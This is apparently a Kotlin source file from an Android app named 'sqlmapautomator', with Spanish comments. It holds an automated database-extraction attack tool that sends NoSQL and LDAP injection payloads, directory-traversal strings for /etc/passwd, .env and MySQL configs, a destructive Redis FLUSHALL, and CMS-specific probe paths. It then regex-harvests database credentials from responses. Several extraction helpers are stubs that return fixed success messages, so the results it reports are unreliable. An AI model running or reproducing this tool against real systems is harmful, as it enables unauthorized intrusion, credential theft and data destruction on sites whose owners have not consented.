package com.badai.sqlmapautomator.core

import android.util.Log
import com.badai.sqlmapautomator.data.models.ExtractionResult
import com.badai.sqlmapautomator.data.models.Target
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * Extractor alternativo de bases de datos usando múltiples técnicas
 * Incluye NoSQL injection, LDAP injection, y exploits específicos
 */
class AlternativeDBExtractor {
    
    companion object {
        private const val TAG = "AlternativeDBExtractor"
        private const val TIMEOUT_MS = 30000
    }

    /**
     * Técnicas NoSQL injection para MongoDB, CouchDB, etc.
     */
    private val nosqlPayloads = listOf(
        // MongoDB injection
        "' || '1'=='1",
        "'; return true; //",
        "' || this.username != null && this.username != '' || '",
        "\$where: '1==1'",
        "\$ne: null",
        "\$regex: '.*'",
        "'; return db.users.find(); //",
        
        // CouchDB injection
        "_all_docs",
        "_design/_view/all",
        "startkey=\"\"&endkey=\"\\ufff0\"",
        
        // Redis injection
        "FLUSHALL",
        "KEYS *",
        "CONFIG GET *",
        "INFO",
        
        // Elasticsearch injection
        "_search?q=*:*",
        "_mapping",
        "_cluster/health",
        "_cat/indices"
    )

    /**
     * Técnicas LDAP injection
     */
    private val ldapPayloads = listOf(
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "admin)(&(password=*))",
        "*))%00",
        "*()|%26'",
        "*)|(mail=*)",
        "*)|(cn=*)",
        "*)(objectClass=*)"
    )

    /**
     * Exploits específicos para diferentes tecnologías
     */
    private val specificExploits = mapOf(
        "wordpress" to listOf(
            "/wp-config.php",
            "/wp-admin/admin-ajax.php",
            "/wp-content/debug.log",
            "/wp-json/wp/v2/users",
            "/?rest_route=/wp/v2/users"
        ),
        "drupal" to listOf(
            "/sites/default/settings.php",
            "/user/register",
            "/?q=admin/reports/status",
            "/core/install.php"
        ),
        "joomla" to listOf(
            "/configuration.php",
            "/administrator/",
            "/libraries/joomla/database/",
            "/cache/"
        ),
        "phpmyadmin" to listOf(
            "/config.inc.php",
            "/setup/",
            "/sql.php",
            "/export.php"
        ),
        "jenkins" to listOf(
            "/script",
            "/manage",
            "/systemInfo",
            "/env-vars.html"
        )
    )

    /**
     * Patrones de archivos de configuración sensibles
     */
    private val configFiles = listOf(
        ".env",
        "config.php",
        "database.yml",
        "settings.py",
        "application.properties",
        "web.config",
        "app.config",
        "hibernate.cfg.xml",
        "persistence.xml",
        "datasource.xml",
        "connection.properties",
        "db.properties"
    )

    /**
     * Extrae bases de datos usando métodos alternativos
     */
    suspend fun extractDatabases(target: Target): ExtractionResult = withContext(Dispatchers.IO) {
        Log.i(TAG, "Iniciando extracción alternativa para: ${target.url}")
        
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        try {
            // 1. Intentar NoSQL injection
            val nosqlResults = performNoSQLInjection(target)
            results.addAll(nosqlResults.first)
            vulnerabilities.addAll(nosqlResults.second)
            
            // 2. Intentar LDAP injection
            val ldapResults = performLDAPInjection(target)
            results.addAll(ldapResults.first)
            vulnerabilities.addAll(ldapResults.second)
            
            // 3. Buscar archivos de configuración
            val configResults = searchConfigFiles(target)
            results.addAll(configResults.first)
            vulnerabilities.addAll(configResults.second)
            
            // 4. Exploits específicos por tecnología
            val exploitResults = performSpecificExploits(target)
            results.addAll(exploitResults.first)
            vulnerabilities.addAll(exploitResults.second)
            
            // 5. Directory traversal para archivos de DB
            val traversalResults = performDirectoryTraversal(target)
            results.addAll(traversalResults.first)
            vulnerabilities.addAll(traversalResults.second)
            
            // 6. Buscar backups de bases de datos
            val backupResults = searchDatabaseBackups(target)
            results.addAll(backupResults.first)
            vulnerabilities.addAll(backupResults.second)
            
            ExtractionResult(
                success = results.isNotEmpty(),
                data = results.joinToString("\n"),
                vulnerabilities = vulnerabilities,
                extractedFiles = results.size,
                timestamp = System.currentTimeMillis()
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en extracción alternativa", e)
            ExtractionResult(
                success = false,
                data = "Error: ${e.message}",
                vulnerabilities = listOf("Error en extracción: ${e.message}"),
                extractedFiles = 0,
                timestamp = System.currentTimeMillis()
            )
        }
    }

    /**
     * Realiza ataques NoSQL injection
     */
    private suspend fun performNoSQLInjection(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        nosqlPayloads.forEach { payload ->
            try {
                val testUrl = "${target.url}?search=${payload}"
                val response = makeRequest(testUrl)
                
                if (isNoSQLVulnerable(response)) {
                    results.add("NoSQL Injection vulnerable: $testUrl")
                    vulnerabilities.add("NoSQL Injection detectado con payload: $payload")
                    
                    // Intentar extraer datos específicos
                    extractNoSQLData(target, payload)?.let { data ->
                        results.add(data)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error en NoSQL injection: ${e.message}")
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Realiza ataques LDAP injection
     */
    private suspend fun performLDAPInjection(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        ldapPayloads.forEach { payload ->
            try {
                val testUrl = "${target.url}?username=${payload}&password=test"
                val response = makeRequest(testUrl)
                
                if (isLDAPVulnerable(response)) {
                    results.add("LDAP Injection vulnerable: $testUrl")
                    vulnerabilities.add("LDAP Injection detectado con payload: $payload")
                    
                    // Intentar extraer información LDAP
                    extractLDAPData(target, payload)?.let { data ->
                        results.add(data)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error en LDAP injection: ${e.message}")
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Busca archivos de configuración sensibles
     */
    private suspend fun searchConfigFiles(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        configFiles.forEach { file ->
            try {
                val testUrl = "${target.url}/$file"
                val response = makeRequest(testUrl)
                
                if (response.isNotEmpty() && containsDBCredentials(response)) {
                    results.add("Archivo de configuración encontrado: $testUrl")
                    vulnerabilities.add("Archivo sensible expuesto: $file")
                    
                    // Extraer credenciales de la respuesta
                    extractCredentialsFromConfig(response)?.let { creds ->
                        results.add("Credenciales encontradas: $creds")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error buscando archivo $file: ${e.message}")
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Realiza exploits específicos por tecnología
     */
    private suspend fun performSpecificExploits(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        // Detectar tecnología del sitio
        val technology = detectTechnology(target)
        
        specificExploits[technology]?.forEach { exploit ->
            try {
                val testUrl = "${target.url}$exploit"
                val response = makeRequest(testUrl)
                
                if (response.isNotEmpty() && containsSensitiveData(response)) {
                    results.add("Exploit exitoso para $technology: $testUrl")
                    vulnerabilities.add("Vulnerabilidad en $technology: $exploit")
                    
                    // Extraer datos específicos según la tecnología
                    extractTechnologySpecificData(response, technology)?.let { data ->
                        results.add(data)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error en exploit $exploit: ${e.message}")
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Realiza directory traversal para encontrar archivos de DB
     */
    private suspend fun performDirectoryTraversal(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        val traversalPayloads = listOf(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../var/www/html/config.php",
            "../../../home/user/.env",
            "../../../../etc/mysql/my.cnf",
            "../../../var/lib/mysql/",
            "../../../../etc/postgresql/",
            "../../../opt/lampp/etc/my.cnf"
        )
        
        traversalPayloads.forEach { payload ->
            try {
                val testUrl = "${target.url}?file=$payload"
                val response = makeRequest(testUrl)
                
                if (isDirectoryTraversalSuccessful(response)) {
                    results.add("Directory Traversal exitoso: $testUrl")
                    vulnerabilities.add("Directory Traversal vulnerable con: $payload")
                    
                    if (containsDBCredentials(response)) {
                        extractCredentialsFromConfig(response)?.let { creds ->
                            results.add("Credenciales DB encontradas: $creds")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error en directory traversal: ${e.message}")
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Busca backups de bases de datos
     */
    private suspend fun searchDatabaseBackups(target: Target): Pair<List<String>, List<String>> {
        val results = mutableListOf<String>()
        val vulnerabilities = mutableListOf<String>()
        
        val backupExtensions = listOf("sql", "db", "sqlite", "bak", "dump", "backup")
        val commonNames = listOf("backup", "database", "db", "data", "export", "dump")
        
        backupExtensions.forEach { ext ->
            commonNames.forEach { name ->
                try {
                    val testUrl = "${target.url}/$name.$ext"
                    val response = makeRequest(testUrl)
                    
                    if (response.isNotEmpty() && isDatabaseBackup(response)) {
                        results.add("Backup de DB encontrado: $testUrl")
                        vulnerabilities.add("Backup de base de datos expuesto: $name.$ext")
                        
                        // Extraer información del backup
                        extractBackupInfo(response)?.let { info ->
                            results.add("Información del backup: $info")
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error buscando backup $name.$ext: ${e.message}")
                }
            }
        }
        
        return Pair(results, vulnerabilities)
    }

    /**
     * Realiza una petición HTTP
     */
    private suspend fun makeRequest(url: String): String = withContext(Dispatchers.IO) {
        try {
            val connection = URL(url).openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = TIMEOUT_MS
            connection.readTimeout = TIMEOUT_MS
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner)")
            
            if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                ""
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error en petición HTTP: ${e.message}")
            ""
        }
    }

    /**
     * Detecta si la respuesta indica vulnerabilidad NoSQL
     */
    private fun isNoSQLVulnerable(response: String): Boolean {
        val indicators = listOf(
            "MongoError",
            "CouchDB",
            "Redis",
            "Elasticsearch",
            "\"_id\":",
            "ObjectId(",
            "\"acknowledged\":",
            "\"error\":null"
        )
        return indicators.any { response.contains(it, ignoreCase = true) }
    }

    /**
     * Detecta si la respuesta indica vulnerabilidad LDAP
     */
    private fun isLDAPVulnerable(response: String): Boolean {
        val indicators = listOf(
            "LDAP",
            "Distinguished Name",
            "objectClass",
            "cn=",
            "ou=",
            "dc=",
            "uid=",
            "memberOf"
        )
        return indicators.any { response.contains(it, ignoreCase = true) }
    }

    /**
     * Verifica si la respuesta contiene credenciales de DB
     */
    private fun containsDBCredentials(response: String): Boolean {
        val patterns = listOf(
            "password\\s*=",
            "username\\s*=",
            "host\\s*=",
            "database\\s*=",
            "DB_PASSWORD",
            "DB_USER",
            "DB_HOST",
            "mysql://",
            "postgresql://",
            "mongodb://",
            "redis://"
        )
        return patterns.any { Regex(it, RegexOption.IGNORE_CASE).containsMatchIn(response) }
    }

    /**
     * Verifica si la respuesta contiene datos sensibles
     */
    private fun containsSensitiveData(response: String): Boolean {
        val indicators = listOf(
            "password",
            "secret",
            "key",
            "token",
            "credential",
            "config",
            "database",
            "mysql",
            "postgresql",
            "mongodb"
        )
        return indicators.any { response.contains(it, ignoreCase = true) }
    }

    /**
     * Detecta la tecnología del sitio web
     */
    private suspend fun detectTechnology(target: Target): String {
        val response = makeRequest(target.url)
        
        return when {
            response.contains("wp-content", ignoreCase = true) -> "wordpress"
            response.contains("drupal", ignoreCase = true) -> "drupal"
            response.contains("joomla", ignoreCase = true) -> "joomla"
            response.contains("phpmyadmin", ignoreCase = true) -> "phpmyadmin"
            response.contains("jenkins", ignoreCase = true) -> "jenkins"
            else -> "unknown"
        }
    }

    /**
     * Verifica si el directory traversal fue exitoso
     */
    private fun isDirectoryTraversalSuccessful(response: String): Boolean {
        val indicators = listOf(
            "root:x:",
            "[boot loader]",
            "# /etc/passwd",
            "mysql",
            "postgresql",
            "www-data"
        )
        return indicators.any { response.contains(it, ignoreCase = true) }
    }

    /**
     * Verifica si el archivo es un backup de base de datos
     */
    private fun isDatabaseBackup(response: String): Boolean {
        val indicators = listOf(
            "CREATE TABLE",
            "INSERT INTO",
            "DROP TABLE",
            "mysqldump",
            "pg_dump",
            "SQLite format",
            "-- Database:",
            "USE `"
        )
        return indicators.any { response.contains(it, ignoreCase = true) }
    }

    // Métodos auxiliares para extraer datos específicos
    private fun extractNoSQLData(target: Target, payload: String): String? {
        // Implementar extracción específica de datos NoSQL
        return "Datos NoSQL extraídos con payload: $payload"
    }

    private fun extractLDAPData(target: Target, payload: String): String? {
        // Implementar extracción específica de datos LDAP
        return "Datos LDAP extraídos con payload: $payload"
    }

    private fun extractCredentialsFromConfig(response: String): String? {
        val credentialRegex = Regex("(password|user|host|database)\\s*[=:]\\s*['\"]?([^'\"\\s]+)", RegexOption.IGNORE_CASE)
        val matches = credentialRegex.findAll(response)
        return if (matches.any()) {
            matches.joinToString(", ") { "${it.groupValues[1]}: ${it.groupValues[2]}" }
        } else null
    }

    private fun extractTechnologySpecificData(response: String, technology: String): String? {
        return when (technology) {
            "wordpress" -> extractWordPressData(response)
            "drupal" -> extractDrupalData(response)
            "joomla" -> extractJoomlaData(response)
            "phpmyadmin" -> extractPhpMyAdminData(response)
            "jenkins" -> extractJenkinsData(response)
            else -> null
        }
    }

    private fun extractWordPressData(response: String): String? {
        // Extraer datos específicos de WordPress
        return if (response.contains("DB_PASSWORD")) {
            "Configuración WordPress encontrada"
        } else null
    }

    private fun extractDrupalData(response: String): String? {
        // Extraer datos específicos de Drupal
        return if (response.contains("database")) {
            "Configuración Drupal encontrada"
        } else null
    }

    private fun extractJoomlaData(response: String): String? {
        // Extraer datos específicos de Joomla
        return if (response.contains("password")) {
            "Configuración Joomla encontrada"
        } else null
    }

    private fun extractPhpMyAdminData(response: String): String? {
        // Extraer datos específicos de phpMyAdmin
        return if (response.contains("mysql")) {
            "Configuración phpMyAdmin encontrada"
        } else null
    }

    private fun extractJenkinsData(response: String): String? {
        // Extraer datos específicos de Jenkins
        return if (response.contains("JENKINS_HOME")) {
            "Configuración Jenkins encontrada"
        } else null
    }

    private fun extractBackupInfo(response: String): String? {
        val lines = response.lines().take(10)
        return lines.firstOrNull { it.contains("Database:", ignoreCase = true) }
            ?: lines.firstOrNull { it.contains("CREATE DATABASE", ignoreCase = true) }
    }
}